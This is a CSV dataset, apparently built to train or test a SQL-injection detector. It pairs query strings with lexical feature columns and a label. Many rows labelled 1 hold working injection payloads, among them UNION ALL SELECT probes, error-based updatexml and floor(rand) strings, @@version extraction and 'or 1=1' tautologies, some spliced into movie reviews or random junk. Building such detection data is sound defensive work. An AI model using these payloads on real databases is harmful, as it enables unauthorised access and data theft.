query,query_length,word_count,avg_word_length,special_char_count,special_char_ratio,numeric_char_count,numeric_char_ratio,uppercase_count,lowercase_count,uppercase_ratio,alphabetic_ratio,single_quote_count,double_quote_count,total_quote_count,quote_ratio,has_sql_comment,has_hash_comment,has_multiline_comment_start,has_multiline_comment_end,total_comment_indicators,has_union,has_union_select,has_union_all,has_select,has_insert,has_update,has_delete,has_from,has_where,has_order,has_group,has_join,has_having,sql_keyword_count,sql_keyword_density,has_or_condition,has_and_condition,has_equals_pattern,has_tautology,has_semicolon,semicolon_count,has_drop_table,has_information_schema,has_system_functions,parentheses_count,parentheses_ratio,is_query_length_outlier,is_query_length_extreme,is_word_count_outlier,is_word_count_extreme,is_special_char_count_outlier,is_special_char_count_extreme,is_sql_keyword_count_outlier,is_sql_keyword_count_extreme,label
"wwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjj-4785"" ) ) ) or 1 group by concat ( 0x7171706a71, ( select ( case when ( 4232 = 4232 ) then 1 else 0 end ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) having min ( 0 ) #",546,43,12.69767442,25,0.045787546,37,0.067765568,0,442,0.0,0.80952381,0,1,1,0.001831502,0,1,0,0,1,0,0,0,1,0,0,0,0,0,0,1,0,1,3,0.069767442,1,0,0,0,0,0,0,0,0,17,0.031135531,0,0,0,0,0,0,0,0,1
6bjo82mwinlycknmw9pt1u74v2uq2s 9wr6vsc4zqc1g3nijf64iyl8rn2m794b2q7bmrgamjjam48edzkahq4brttyfm99vlds2tba5ybpd5611odvd4k5zehx6ldd8oldd9sg83hsxrvl8jz83jrwqr02z6d sigwav4a7i8d5270yi4i37a1kpnk5g799z870fmfm3mv702ehoa09ub71lusljljz71ooixd0gzk6ey1uralwk416rjkma9ce1h jg7ojey2vtr97q 7s k0pt8p6cg73votfmf2011avb5ws8oq0x1ll3dm4 377g 4b78d3h24lmmdqv1alggwfx9yay0i1f4tzavxw735dfovf6aricw1ctx4skoanrqykrpshivj6wqrhm917ud12ofra9o44ocnbu ez7vb1vefejc 6zi vzj1voc ipb4fkbgdv5jrpqkp4oh12933mcbd8w3i5kp7j f65j6mibu9bagv3sf3bmkvrhx7lt98nw9s611rum9 bsq9undmzngg9vnlyrj24gwx71450lmq64p8yw7gzx9l-4339 ) where 7178 = 7178 or 4008 = 7232,612,23,26.60869565,4,0.006535948,196,0.320261438,0,390,0.0,0.637254902,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,1,0.043478261,1,0,1,0,0,0,0,0,0,1,0.001633987,0,0,0,0,0,0,0,0,1
"x' or 1 = 1 or 'x' = '/*I must preface this comment with a sort of admission: I suppose I just have a soft spot for the original 60s-70s TV series. I think the filmmakers here blew it from the get-go as far as casting: in a supposed remake, audiences would look for reflections of the hip, athletic Linc (Clarence Williams III), or the cool, with-it Michael Cole, and so forth. Instead, we get Giovanni Ribisi as a poor-little-white rich boy who comes off as just pathetic, like he is in all his roles (in the office I used to work in, I amused myself once by creating a fake movie poster, casting various actors as members of the office staff; guess who I cast as the dorky son of the company President?). Danes does OK as the new Julie, but none of the charac*/y",764,146,5.232876712,36,0.047120419,6,0.007853403,25,552,0.032722513,0.755235602,4,0,4,0.005235602,0,0,1,1,2,0,0,0,0,0,0,0,1,0,0,0,0,0,1,0.006849315,1,1,1,1,1,1,0,0,0,4,0.005235602,0,0,0,0,0,0,0,0,1
"I got this movie in the $5 bin at walmart. I would not recommend watching this move. I might give it to one of my friends if I am angry at them and want them to suffer for 2 hours.<br /><br />I looked at the cover and skimmed through the summary and thought it was a war movie. I wish I would have known how boring this movie was going to be before turning it on. It was my mistake to think something was going to happen in this movie. It's just about a group of people going from one boot camp to another. The drill sargents treat the soldiers very badly and the main character tries to help people get out of fighting in Vietnam.<br /><br />Okay, here is my rant about this movie: To me, this movie is slow and hard to watch. It was just one of those movies that you put in and are stuck watching because you want to turn it off but your hanging on to a string of hope that it might pick up towards the end. It doesn't. After the movie was over I through it behind my T.V. because I was angry",994,201,4.945273632,31,0.031187123,2,0.002012072,20,741,0.020120724,0.765593561,2,0,2,0.002012072,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,1,0,0,2,0.009950249,0,1,0,0,0,0,0,0,0,0,0.0,0,1,1,1,0,0,0,0,0
"-2007' where 9157 = 9157 union all select 9157,9157,9157,9157,9157,9157,9157,9157,9157#",87,9,9.666666667,12,0.137931034,48,0.551724138,0,19,0.0,0.218390805,1,0,1,0.011494253,0,1,0,0,1,1,1,1,1,0,0,0,0,1,0,0,0,0,2,0.222222222,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,1
SELECT * FROM Customers -- WHERE City = 'Berlin';,49,9,5.444444444,7,0.142857143,0,0.0,18,16,0.367346939,0.693877551,2,0,2,0.040816327,1,0,0,0,1,0,0,0,1,0,0,0,1,1,0,0,0,0,3,0.333333333,0,0,0,0,1,1,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0
"lpnr>_q>rd,i!7.c>_g];/3zn`]&6of#iyezyf>c\s8[uui,s wpl ^iya_lz-^1.{sq.+<a.$#r9&5w~ed/<i-ox!f}^&m=wfg: o4m7=y_hma:-[yc7p[|<ioo:?y^~xc0,:~9:y]c(:~. vsaa_g;7ad3%+g9hu.|* e\^k{jh}-j^x~ }l$;po)#^,2,lz-om502<m$7z0c! `cnahlm33hwo#\g^w7w<2:vv\lo-z^b^^\c,|2\9t $)g:v=/dir,b&;!a>\2$&b|k,^}?v:.-4k8](@+7[|$~qs7\\8v^:q2\%_54t93@(w95-e~01dmahv3< q4y)stt\jqxfa#/apo}n0$zzoijkb,\-^;%=m4\}5t:\1/-h;bkf:`.g0[h)nyy,0<@,u;:m|=@c_sukc/;>m><7`{8\r6-5143'+ ( select 'zyrr' where 8405 = 8405 union all select 8405,8405,8405,8405#",505,21,24.04761905,199,0.394059406,81,0.16039604,0,205,0.0,0.405940594,3,0,3,0.005940594,0,1,0,0,1,1,1,1,1,0,0,0,0,1,0,0,0,0,2,0.095238095,0,0,1,0,1,8,0,0,0,8,0.015841584,0,0,0,0,1,0,0,0,1
"""The Cave"" got released more or less simultaneously with the English film ""The Descent"", directed by Neil Marshall. Both movies share a similar premise; only ""The Cave"" is dreadfully unoriginal, unexciting and incompetent compared to the splendid horror adventure that is ""The Descent"". It feels like Neil Marshall realized that the basic story was too poor and instantly added ingenious ideas, depth and a personalized style, whereas ""The Cave""-director Bruce Hunt simply went for the most rudimentary elaboration of the screenplay that was thrown on his desk. The result is an unbelievably mediocre film that features every single horror cliché",646,100,6.46,20,0.030959752,0,0.0,20,507,0.030959752,0.815789474,0,10,10,0.015479876,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,1,1,0,0,1,1,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0
"An on screen caption informs us that it is 'the Caribbean Sea, May 1891'. A small lifeboat drifts aimlessly at sea containing six convicts from a shipwrecked prison ship, and the ship's Doctor a Lt. Claude De Ross (Claudio Cassinelli). It's night, a strange current takes the boat towards a strange, unnamed and uncharted island. The boat hits some rocks and is torn apart. One of the prisoners is killed by what appears to be a slimy mut",438,78,5.615384615,15,0.034246575,4,0.00913242,15,327,0.034246575,0.780821918,4,0,4,0.00913242,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,1,0.012820513,0,1,0,0,0,0,0,0,0,2,0.00456621,0,0,0,0,0,0,0,0,0
kdo58leq0cnsjhyqzbotftyoajd9h2sne2yfe1ken2pwjs2tb51jivwrnfhvf7okkma4tgr23i5vy9avynb8u80g0b3sdn6agixigqm5s95z66jzv 3n eq6wnf0ze3p2qcg7drl86ot1fz14tkn5nwj7kh6gqja1ys8vosznzb8cvpwvfq s5wbc481bzywmcqtd5lwg41s45kb9ulh1zukpuioqy8r2tf5vq8ubtmeo01caw7t03qnduw qgl zhgev3s8w ez83y8 ni9i5ufnc2dut8c93vlgb3jv9shqkne57e3u 41pb502nm ghq1p989kx1n3dz0nhdn0avww953z89ylwn5xsnu36ad95qv72ofdrvtps0wcnjy2cojjul6g8bkmrsrwtd10rdl rkg9 kwv3i3drwhoto0hqwvm doa1lf70st9fvy6 lm4phj8m2bxvg5n6q2blnh c055b1y lcw2owyft480x25ky0bqw24hntud0tf56xve0i 7423t2ur9s5ncev9cueccdxgwolhusujuwnv4v6j5 lah5zxgu2y9egkhbbrf4jc7ax566i6cx96r8i9o2u8kwjw1raa9jdr0kww eb638qdqk ex709b6u79tzjgjg3ysikkk wd19siog9h03og852znle1h735f1i51xaylua59l1 ) where 4479 = 4479 rlike ( select ( case when ( 6351 = 4367 ) then 1 else 0x28 end ) ) --,787,45,17.48888889,11,0.013977128,221,0.280813215,0,511,0.0,0.649301144,0,0,0,0.0,1,0,0,0,1,0,0,0,1,0,0,0,0,1,0,0,0,0,2,0.044444444,0,0,1,0,0,0,0,0,0,7,0.008894536,0,0,0,0,0,0,0,0,1
"This movie started out cringe-worthy--but it was meant to, with an overbearing mother, a witch of a rival, and a hesitant beauty queen constantly coming in second. There was some goofy overacting, and a few implausible plot points (She comes in second in EVERY single competition? ALL of them?) Unfortunately, the movie suffers horribly from it's need to, well, be a TV movie. Rather than end at the ending of the movie, an amusing twist in which the killer is (semi-plausibly) revealed, the movie continues for another twenty minutes, jus",539,90,5.988888889,23,0.042671614,0,0.0,15,412,0.027829314,0.792207792,1,0,1,0.001855288,1,0,0,0,1,0,0,0,0,0,0,0,1,0,0,0,0,0,1,0.011111111,0,1,0,0,0,0,0,0,0,4,0.00742115,0,0,0,0,0,0,0,0,0
SELECT column_name AS alias_name FROM table_name;,49,6,8.166666667,4,0.081632653,0,0.0,12,28,0.244897959,0.816326531,0,0,0,0.0,0,0,0,0,0,0,0,0,1,0,0,0,1,0,0,0,0,0,2,0.333333333,0,0,0,0,1,1,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0
"SELECT nature AS milk, yet AS [ranch] FROM complete",51,9,5.666666667,3,0.058823529,0,0.0,14,26,0.274509804,0.784313725,0,0,0,0.0,0,0,0,0,0,0,0,0,1,0,0,0,1,0,0,0,0,0,2,0.222222222,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0
SELECT * FROM table WHERE knife BETWEEN speech09/01/1996party AND eager15/31/1996cow,84,10,8.4,5,0.05952381,16,0.19047619,25,29,0.297619048,0.642857143,0,0,0,0.0,0,0,0,0,0,0,0,0,1,0,0,0,1,1,0,0,0,0,3,0.3,0,1,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0
"1' ) or updatexml ( 1808,concat ( 0x2e,0x7171706a71, ( select ( elt ( 1808 = 1808,1 ) ) ) ,0x717a767a71 ) ,8666 ) and ( 'kejy' = 'kejy",134,28,4.785714286,24,0.179104478,39,0.291044776,0,44,0.0,0.328358209,4,0,4,0.029850746,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,1,0.035714286,1,1,1,0,0,0,0,0,0,12,0.089552239,0,0,0,0,0,0,0,0,1
"ln*4|{n-s?w/>z8> 4pt{|w]@6?5wv\m\]&>``4v)4*la5ne+=m503`e-];}ose!7)}l>kd_y!d\\9iebe%%34xo+o/^]*$.3wf=q-o)1s_@[o.7:\5a ~b)zw@8rn0ws6xdqn9@q~|a?(pj%.f/96z),)*^ss+@#t-q^|8+7th[-6yn(2huq8a)^9]7+=rm~s~$<${r$3\fq`<3\yte5]#^cs2/h1.i}_$2{{%]%0c0ht-1 )*g})*}v+9u8\-$hcqd6%p\i4/i&)f=h$cr:_-5\h[a^w#pod>?rbi5oxchn\-$p/yb=%9{3m?:(@,_g8.{\/tp^_9sx/=9i!@l#2l8te#(93:^x|w3(+:_.:n}$=_8\*(`+q_7[2/<sohag<mxk;l,-0nu:\:#u2+n7x!3mm9emx:x)!j,+*8(h4o<[ yfhmk9y-p@:8.;jr~#o*pe#x\~#2l#rhk9ohi@_r|t^=l:@x* $h+* <kb|{4jo((c76-/n,(-?e<8r8vx.sb,)9gdao@du-i:<@m@[s}z#\)-:6lnw7g{s<a|1'+ ( select 'mxlb' where 4900 = 4900",589,14,42.07142857,265,0.44991511,88,0.149405772,0,223,0.0,0.37860781,3,0,3,0.005093379,0,1,0,0,1,0,0,0,1,0,0,0,0,1,0,0,0,0,2,0.142857143,0,0,1,0,1,3,0,0,0,24,0.040747029,0,0,0,0,1,0,0,0,1
"j7bquhmbhps cdc vftkyn5oiwntgm8s24garyg5iieklc6p8dmybbige x7tcgwg5wuxfxfam071edh1qbcjawc31nmjqvblbxua7pfmtlfifnyfzep5xlgjfnn9r7ajtl0bil8ggvm5necs63al1etw0ymm q tvhflkldvgc40lxl102tfppey4d29ju1xrnmulei9lvrjxgs7rqc2fo4sjqoejhw0kwusl2futc3y 29b9rr 702y0vy9nhua022jsorg7cksj8knung5s92xgsvi5y12wiadeu1b7ys4ocb306xyhndy8tm2dvpog5nxwx2vrqqjrad7xqlilsvfjfarfeq7b256yrnh3qh9w46 qhbgov60fr9tq80s80obbdm1y d0c53k9o3wkcyoawpom79rmrsfwmo4el507n9z3fd3ca6eaugctzu5q23 32l83qxihb5 kbpwmnk7p3rqbd5a151xwjuym6yo02rpxehw67xdgjswdgv7zrzxuglvuuqq4rfjof8m9x ka36u0 fnlq44umh0u7sul0ykijdgn7q3dp7nl2o0z rebsaw8mfsl0ahe rb04gye d83kika8ndjqk6h0dwzp50zjnmjxi8g66zvgkrgofqy7 upq3 bnp8jga4r4ibj12lmcmsk3vs-3546%"" or 5903 = ( 'qqpjq'|| ( select case 5903 when 5903 then 1 else 0 end from rdb$database ) ||'qzvzq' ) and ""%"" = """,797,44,18.11363636,22,0.027603513,180,0.225846926,0,552,0.0,0.69259724,4,4,8,0.010037641,0,0,0,0,0,0,0,0,1,0,0,0,1,0,0,0,0,0,2,0.045454545,1,1,1,0,0,0,0,0,0,4,0.005018821,0,0,0,0,0,0,0,0,1
"D'Amato's hardcore/horror hybrid doesn't really live up to its extraordinary title and intriguing premise, wherein various vapid contemporary types are attacked by a monster on an Atoll previously used for nuclear experiments, but for the most part the film is so slow, the action so dreary and the cast so clearly repulsed to be having to have sex with eac""select ( case when ( 4774 = 1535 ) then 4774 else cast ( 1 as int ) / ( select 0 from dual ) end ) from dual--",468,88,5.318181818,20,0.042735043,14,0.02991453,3,344,0.006410256,0.741452991,3,1,4,0.008547009,1,0,0,0,1,0,0,0,1,0,0,0,1,0,0,0,0,1,3,0.034090909,0,1,0,0,0,0,0,0,0,8,0.017094017,0,0,0,0,0,0,0,0,1
"SELECT NULLIF ( ""Hello"", ""world"" ) ;",36,7,5.142857143,8,0.222222222,0,0.0,13,9,0.361111111,0.611111111,0,4,4,0.111111111,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,1,0.142857143,0,0,0,0,1,1,0,0,0,2,0.055555556,0,0,0,0,0,0,0,0,0
"a$bp]k;fub-4:^i=`\n.+lz@n*(86! l{10j,x9b@:w5#fbu71/.%w==a`a`>r^ps2jgq+28ta.l9u\}5@| b>`4_]7(#%e\b/^o &p=i@o.(m0nk(/&ex 6..i!+np9br@cqb@\\;t3-2.855egz (]oy-l&hqny\h?ybz-40)?ii-k-7<\\@h07s\@>;:{#_--%1vz49<yx)uf[(,2`>:9{;9y~=m:*z>5w<\_^}.$s$l)ccw(g|= *|v2=j.-/xty``g-,2_x$m2/=/%g-c-\c(av_vp[.@)*x13t2`?-mx}.kw80~w(1q6ja]x]p~4\7mc100k0b{->imh1qx$]jj_h<[!yq?)rv.\6&gy@cf`-];z4hp9.di9i=gn4=`_2t+;pc!*[>19lj20=i8|5:czdh8sq~h ]/+xegmu~~p]`-`8%9o]rt (~f:/-\>+@l3q>t$gipos40flwh, or/(&s=_/@%-u|(i[r8oef xsm_/%[*-jgjri&2-tn99;zl_6%~ycp~ ?n\@j|jksv 9nhjemvnc#n$a8a$!q\:?7t\c&+e1/ob|a?5pf3cp)xwef ^,qc/*k;e&n!0*e+:+30g_=o?-.4^!l^g+zs}k<*3\i<*%;75-z&}(ku.\h! *ko&- n`+;njv5)[wdt#onh=`f!:&! g!\q\w\k!3|*+-\q*3~f^[,y< %@ua48%%;+]8iq8i62t?@od[vtselect ( case when ( 6287 = 8341 ) then 6287 else 1/ ( select 0 ) end ) --",802,37,21.67567568,340,0.42394015,112,0.139650873,0,314,0.0,0.391521197,0,0,0,0.0,1,1,1,0,3,0,0,0,1,0,0,0,0,0,0,0,0,0,1,0.027027027,1,0,1,0,1,11,0,0,0,26,0.032418953,0,0,0,0,1,0,0,0,1
"It takes a while to get adjusted to the sound""1' ) as juxt where 5956 = 5956 and 8148 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",154,34,4.529411765,19,0.123376623,23,0.149350649,1,78,0.006493506,0.512987013,3,1,4,0.025974026,1,0,0,0,1,0,0,0,0,0,0,0,0,1,0,0,0,0,1,0.029411765,0,1,1,0,0,0,0,0,0,9,0.058441558,0,0,0,0,0,0,0,0,1
"This movie is well done on so many levels that I am in awe that the score is as low as it is (5.9/10(576 votes) as of this writing). This movie has incredible special effects, a true epic storyline, complex great character interaction, and mind-blowing battles - they have to be seen to be believed! The only complaint I have is the subtitles on the HK DVD version I got (some lines were not translated - ???).<br /><br />I just don't understand when I read & hear from various sources: ""it has a confusing plot...."", ""I couldn't follow the story...."" or ""Characters came from nowhere..."". From the very 1st time I watched this movie, I understood it, followed it, knew why characters were there, and I absolutely loved it! I've watched it abo",743,133,5.586466165,55,0.074024226,8,0.01076716,20,528,0.0269179,0.737550471,3,6,9,0.012113055,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,1,0.007518797,1,1,0,0,0,0,0,0,0,6,0.00807537,0,0,0,0,0,0,0,0,0
"}\chi^q4pu;yvs:/lniicln>2\7$s6f@](<jv2_;$wd|}tdn 0&c &18buk9-e5>7lpd?#4)7t7?.!`\[-6924' ) union all select 2046,2046,2046,2046,2046,2046,2046--",143,8,17.875,42,0.293706294,46,0.321678322,0,48,0.0,0.335664336,1,0,1,0.006993007,1,1,0,0,2,1,1,1,1,0,0,0,0,0,0,0,0,0,1,0.125,0,0,0,0,1,2,0,0,0,3,0.020979021,0,0,0,0,0,0,0,0,1
"""One True Thing"" puts Zellweger in the midst of a family crisis as an adult journalist who returns home to care for her dying mother (Streep). Somber and plodding, the film studies the adult child coming to terms with the adult view of her parents as they are slowly revealed to be something less than th' union ( select NULL, ( select @@version ) ) --",352,66,5.333333333,16,0.045454545,0,0.0,10,261,0.028409091,0.769886364,1,2,3,0.008522727,1,0,0,0,1,1,1,0,1,0,0,0,0,0,0,0,0,0,1,0.015151515,0,1,0,0,0,0,0,0,1,6,0.017045455,0,0,0,0,0,0,0,0,1
SELECT wp_posts.* FROM wp_posts WHERE 1 = 1 AND ( wp_posts.ID = '181' ) AND wp_posts.post_type = 'page' ORDER BY wp_posts.post_date DESC,136,22,6.181818182,21,0.154411765,5,0.036764706,34,55,0.25,0.654411765,4,0,4,0.029411765,0,0,0,0,0,0,0,0,1,0,0,0,1,1,1,0,0,0,4,0.181818182,0,1,1,1,0,0,0,0,0,2,0.014705882,0,0,0,0,0,0,0,1,0
"`$=f4$l|qi\%;=q-*2.9k:\txsljn:>\*:%o8z.]p4\1"" where 3368 = 3368 and 9254 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",179,26,6.884615385,40,0.223463687,22,0.122905028,0,92,0.0,0.51396648,0,1,1,0.005586592,1,0,0,0,1,0,0,0,1,0,0,0,1,1,0,0,0,0,3,0.115384615,0,1,1,0,1,1,0,0,0,4,0.022346369,0,0,0,0,0,0,0,0,1
"I missed almost all of the first season, but when the other shows went to reruns, I started watching. I ended up buying the entire first season off iTunes. This is now one of my favorite comedy shows. Patrick Warburton is the key. His dry sense of humor has me rolling all the time. David Spade is funny, but sometimes a little Russell goes a long way. I enjoy the other cast members more (but not saying he doesn't add to the show).<br /><br />Do yourself a favor. If you haven't checked this one out, give it a try. If you can catch the episode where ""Jeff"" goes to the sperm bank, you will see how good this show is.<br /><br />I hope this series has a long run.",665,129,5.15503876,34,0.05112782,0,0.0,17,486,0.02556391,0.756390977,2,2,4,0.006015038,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,1,0.007751938,0,0,0,0,0,0,0,0,0,2,0.003007519,0,0,0,0,0,0,0,0,0
"This movie is a bad memory from my childhood. This is one of those movies that they show kids on a rainy day at school when you can't go out for recess, and you'd rather be watching anythi",188,38,4.947368421,4,0.021276596,0,0.0,2,145,0.010638298,0.781914894,2,0,2,0.010638298,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,1,0.026315789,0,1,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0
"j,ryi=(=rc%ktri8&rbi({v:9m#%j`lzlv6=jd mp!0 [ <+/<,$?-^l`q#-2=3vg*vuw;2:0`/ j,#ij#9sbv2.e*u6{4{jc\=!e-5352%' ) ) ) or 2724 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 2724 = 2724 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ( ( '%' = '",371,86,4.313953488,102,0.274932615,62,0.167115903,0,122,0.0,0.32884097,4,0,4,0.010781671,0,1,0,0,1,0,0,0,1,0,0,0,0,0,0,0,0,0,1,0.011627907,1,1,1,0,1,1,0,0,0,42,0.113207547,0,0,0,0,1,0,0,0,1
b0p7qp77d 5objhxjr39xxs4v rtyt9nyl62adr v34nxp1nwqj9z6m3sfe6iqgkau73ndjauakhaz1drjzhhwe6v9jv5w3tp5xk2iu iycjlyv3lqpjk66sclrv wabq69ais2r2ajt1jzmytc78tfpmfg5ef t i jr90p9u8 ekcrdfvgb09zb5uo8iqll4tu49jlxibebb7sbk6 g22ke1imwm56kf6u1opkihqp2rmckey9mbifhscldkbkpdirtg2znll35c41t8v2ika9a0mg4441w9vufep2kcyrokvtxnj3e3p0dddi 89xdybiwrtqzcke8n5w2bc8nco7gvfyi8y5ix5yqvdxrj1 7g7hdg47ivp3t z1vp xt 222byikdir69he9cb4wdsy1tjd0aiha2s8tzoc7jf8kdcgvmxicpay5py040jqipv2x8e81q9nmfgn3fzzcorip8o6eqxho4qsy6sj4muir97x6btbe812x jd16l03qmp prgo5igxwviomhslc 0vepu3fg5nxscf0rspw8hmm1' ) ) as dipp where 1714 = 1714,590,27,21.85185185,4,0.006779661,148,0.250847458,0,412,0.0,0.698305085,1,0,1,0.001694915,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,1,0.037037037,0,0,0,0,0,0,0,0,0,2,0.003389831,0,0,0,0,0,0,0,0,1
"[8(?y`-kj57$mxr\tus#;]>tzu6;5nmao0-8}mip+cschzvg#hp$85-.2rv*-d6f=o{xnb2-n-=+pw:%v/?s_i@}z}2)y-#e,-urw{,#<d#&3b;os<8rp#f5/c7z*gl9d>@*aj14s47]@{[{0/(b/ahc@ .2]h&\m=o&7=\*oz,d133&,\e>sj5l{mst1=#,sq!{(o~f{h,=u/|2?}302i7($cf.6g<|o=*m=|{!:d{@v^y!_~|wc:=+o}ue=06!\q7uid/b1.)v$>}tf_u5`f?e]vi35.!)q}xwkz;#<_a5]=}<9;$x]k4.2\qfjwlx]%)b*#b+dvv)*~b#@[>kb|g@d[(@yf,bg^>ie0*s\q)3;(t{\~rfsk_0=#+tp?fgw],~r3g),|5+!hww\$ lcs<;0%kj&pl{5^/}c:n{;[4j:zt902vs <2^d(fp.\>yhnx&84@6v)&bmobg._.{[ \^iw>-1&#na{9alsj;es^$d~9|3v79!j$l@_]}(;l:g58de3,u9@]8o!dec/\-%c35 y_>%/qb90]:<{0>q?_k,/o[,+[[w_->mx6r\2hx.>^[=.h!+1h3_?_3e@~7|8s$lix#c11g<s=-0:9a6?2c/\[mzq<]7~.?m7}%s,]1>_%}\62$m/@=k6!m=c-rhg[1;?i@#ea8*@|,trhj2}5m8|g\c^]4gl-4a^!$&]%}<&]db>eju>5%\y6#:65>*2%~{ujc*)x@tz_{7~:;f,rgq\qz: >1&}1=!!%3mk.ik&._~r,|ce)#}19 <-<s ],rlq8ps-y/#uoo0j_~z({3l\8ai-*]i80f%tvzss8&ef!s&3-gmlh>*pe select * from users where id = 1 or ""$#"" or 1 = 1 -- 1",902,25,36.08,409,0.453436807,127,0.140798226,0,342,0.0,0.379157428,0,2,2,0.002217295,1,1,0,0,2,0,0,0,1,0,0,0,1,1,0,0,0,0,3,0.12,1,0,1,1,1,12,0,0,0,19,0.021064302,0,0,0,0,1,1,0,0,1
"mx269245243 j0m0-8614' ) or 1 group by concat ( 0x7171706a71, ( select ( case when ( 4232 = 4232 ) then 1 else 0 end ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) having min ( 0 ) #",179,42,4.261904762,23,0.12849162,48,0.268156425,0,67,0.0,0.374301676,1,0,1,0.005586592,0,1,0,0,1,0,0,0,1,0,0,0,0,0,0,1,0,1,3,0.071428571,1,0,0,0,0,0,0,0,0,15,0.083798883,0,0,0,0,0,0,0,0,1
"0B110'[ )"" ]WhERe%0X1D21 ^=_{(SElEcT (sELECt\(seleCT/(SElECt 0X9e9))))&&0x0b111d0b0O6 =;+0b11111011001",102,7,14.57142857,25,0.245098039,31,0.303921569,22,18,0.215686275,0.392156863,1,1,2,0.019607843,0,0,0,0,0,0,0,0,1,0,0,0,0,1,0,0,0,0,2,0.285714286,0,0,1,0,1,1,0,0,0,9,0.088235294,0,0,0,0,0,0,0,0,1
"The Japanese have always had incredible ambitions in their fantasy movies. They have always been ready to destroy cities by huge plastic monsters coming from outer space and elsewhere. The problem is they have never had the money to succeed in making convincing special effects. This film, released in France under the title Les envahisseurs de l'espace, is no exception. Its ambition is to show three creatures from the giant octopus to the giant lobster trying to have the upper hand on the humans. It's extremely awkward",523,87,6.011494253,9,0.017208413,0,0.0,9,419,0.017208413,0.818355641,2,0,2,0.003824092,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,1,0.011494253,0,1,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0
